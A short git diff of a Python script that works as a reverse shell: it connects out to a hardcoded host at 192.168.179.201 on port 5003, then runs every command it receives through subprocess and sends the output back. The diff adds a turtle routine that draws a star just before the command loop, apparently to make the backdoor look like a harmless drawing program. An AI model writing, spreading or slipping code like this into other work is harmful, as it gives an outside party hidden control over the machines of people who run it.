@@ -2,10 +2,24 @@ from email import message
 import socket
 import os
 import subprocess
-import sys
+import turtle
 
-hostname=socket.gethostname()
-ser_host = socket.gethostbyname(hostname) 
+def fun():
+    import time
+    star = turtle.Turtle()
+ 
+    star.right(75)
+    star.forward(100)
+    
+    for i in range(4):
+        star.right(144)
+        star.forward(100)
+        if (i==3):
+            turtle.Screen().exitonclick()
+    
+
+# hostname=socket.gethostname()
+ser_host = "192.168.179.201"
 ser_port = 5003
 size = 1024*128
 sep = "<sep>"
@@ -16,6 +30,8 @@ s.connect((ser_host, ser_port))
 cwd = os.getcwd()
 s.send(cwd.encode())
 
+
+fun()
 while True:
     command = s.recv(size).decode()
     split_command = command.split()
@@ -32,7 +48,6 @@ while True:
             out = ""
     else:
         out = subprocess.getoutput(command)
-
     cwd = os.getcwd()
 
     msg = f"{out}{sep}{cwd}"
